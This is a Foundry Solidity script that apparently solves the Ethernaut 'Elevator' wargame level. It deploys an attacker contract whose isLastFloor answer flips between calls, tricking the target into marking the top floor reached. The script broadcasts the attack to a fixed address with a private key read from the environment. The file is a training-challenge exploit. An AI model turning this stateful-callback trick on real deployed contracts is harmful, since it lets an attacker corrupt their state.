// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Elevator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackBuilding {
    uint256 public call_count = 0;

    constructor() {}

    function attack(Elevator _elevator) public {
        _elevator.goTo(10);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (call_count >= 1 && _floor == 10) {
            return true;
        }

        call_count += 1;
        return false;
    }
}

contract ElevatorSolution is Script {
    Elevator public elevator = Elevator(0xfa89b72C42f939866874094E998F6081cECA4487);
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Top floor before: ", elevator.top());

        AttackBuilding building = new AttackBuilding();
        building.attack(elevator);

        console.log("Top floor after: ", elevator.top());
        
        vm.stopBroadcast();
    }
}